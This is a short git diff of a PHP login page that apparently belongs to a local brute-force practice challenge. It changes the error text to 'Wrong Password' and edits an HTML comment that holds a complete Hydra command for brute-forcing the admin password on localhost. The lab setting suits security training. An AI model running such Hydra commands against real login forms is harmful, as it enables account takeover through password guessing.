@@ -68,7 +68,7 @@ if (isset($_POST['submit'])) {
 			</div>
 			<form method="POST">
 				<? if ($incorrect) { ?>
-				<p5 style="color: red; margin-left: 110px;">Username/Password combination invalid</p5>
+				<p5 style="color: red; margin-left: 110px;">Wrong Password</p5>
 				<? } ?>
 				<div class="input_bar">
 					<input type="text" name="username" id="un" placeholder="Username" />
@@ -122,8 +122,4 @@ if (isset($_POST['submit'])) {
 
 </html>
 
-<<<<<<< HEAD
-<!-- .\hydra.exe -V -l admin -P .\passlist.txt -s 8080 localhost http-post-form "/bruteforce/bruteforce.php:username=admin&password=^PASS^&submit=Login:Wrong Password"
-=======
-<!-- .\hydra.exe -V -l admin -P .\passlist.txt -s 8080 localhost http-post-form "challenges/bruteforce/index.php:username=admin&password=^PASS^&submit=Login:Wrong Password"
->>>>>>> d9c46d5611ebaa1ca72d4c8d367be383194b02d7
+<!-- .\hydra.exe -t 25 -I -V -l admin -P .\passlist.txt -s 8080 localhost http-post-form "/challenges/bruteforce/index.php:username=admin&password=^PASS^&submit=Login:Wrong Password"
